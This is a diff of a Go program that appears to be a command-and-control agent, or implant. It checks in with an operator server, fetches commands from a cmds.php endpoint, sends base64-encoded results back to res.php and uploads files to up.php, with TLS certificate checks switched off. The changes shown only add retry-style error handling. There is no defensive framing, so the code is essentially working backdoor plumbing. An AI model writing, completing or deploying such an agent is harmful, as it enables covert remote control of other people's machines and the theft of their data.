@@ -20,6 +20,7 @@ import (
 
 
 func main() {
+
 id := os.Args[1]
 data := "Hello From Agent "+ id +" (Go)"
 sEnc := b64.StdEncoding.EncodeToString([]byte(data))
@@ -29,6 +30,7 @@ http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSk
 _, err := http.Get(os.Args[2]+"/res.php?id="+id+"&res=" + sEnc )
 if err != nil {
 	fmt.Println(err)
+
 }
 
 
@@ -61,6 +63,7 @@ func createForm(form map[string]string) (string, io.Reader, error) {
    return mp.FormDataContentType(), body, nil
 }
 
+
 func hey(){
 
 id := os.Args[1]
@@ -68,6 +71,8 @@ http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSk
 res, err := http.Get(os.Args[2]+"/cmds.php?id="+id+"&o=G")
 if err != nil {
 	fmt.Println(err)
+	time.Sleep(10 * time.Second)
+	return
 	}
 resBody, err := ioutil.ReadAll(res.Body)
 
@@ -99,6 +104,9 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
       gimme, err := http.Get(os.Args[2]+"/res.php?res="+b64Output+"&id="+id)
       if err != nil {
 	fmt.Println(err)
+	time.Sleep(10 * time.Second)
+	return
+	
 	}
       fmt.Println(gimme)	
       }
@@ -124,12 +132,18 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
       
       msgup, err := http.Get(os.Args[2]+"/res.php?res="+filemsgEnc+"&id="+id)
       if err != nil {
+       
 	fmt.Println(err)
+	time.Sleep(10 * time.Second)
+	return
 	}
       fmt.Println(msgup)
       gimme, err := http.Post(os.Args[2]+"/up.php?id="+id, ct, body)
       if err != nil {
 	fmt.Println(err)
+	time.Sleep(10 * time.Second)
+	return
+
 	}
       fmt.Println(gimme)	
       }
